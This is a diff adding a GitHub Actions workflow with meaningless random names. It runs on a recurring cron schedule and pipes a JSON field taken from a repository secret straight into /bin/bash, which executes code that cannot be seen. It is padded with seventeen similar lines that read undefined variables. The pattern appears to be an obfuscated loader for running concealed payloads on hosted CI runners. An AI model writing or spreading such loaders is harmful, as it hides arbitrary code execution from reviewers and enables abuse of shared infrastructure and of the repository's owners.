@@ -1,0 +1,36 @@
+name: zhengjudian6715
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhengjudian6715
+        env:
+          k03: ${{ secrets.k03 }}
+        run: |
+          echo $k03 | jq -r .hjlzz73593 | /bin/bash
+          echo $q2675 | jq -r .mwqsu3088 | /bin/bash
+          echo $lwmn90 | jq -r .rbhqe54 | /bin/bash
+          echo $qi7407 | jq -r .ngufi478 | /bin/bash
+          echo $is1 | jq -r .w9042 | /bin/bash
+          echo $sycxw2080 | jq -r .iwser3 | /bin/bash
+          echo $ldw6553 | jq -r .mb41620 | /bin/bash
+          echo $agkma99802 | jq -r .s936 | /bin/bash
+          echo $tw613 | jq -r .m0771 | /bin/bash
+          echo $x378 | jq -r .uf18 | /bin/bash
+          echo $grgwe657 | jq -r .btwj8 | /bin/bash
+          echo $toej858 | jq -r .nsek24 | /bin/bash
+          echo $nituz69 | jq -r .rm27783 | /bin/bash
+          echo $tukz5412 | jq -r .zslpb90823 | /bin/bash
+          echo $taau951 | jq -r .mbmia4978 | /bin/bash
+          echo $cgf2835 | jq -r .o9646 | /bin/bash
+          echo $njsip4 | jq -r .uw91 | /bin/bash
+          echo $a52 | jq -r .uxns24663 | /bin/bash
+
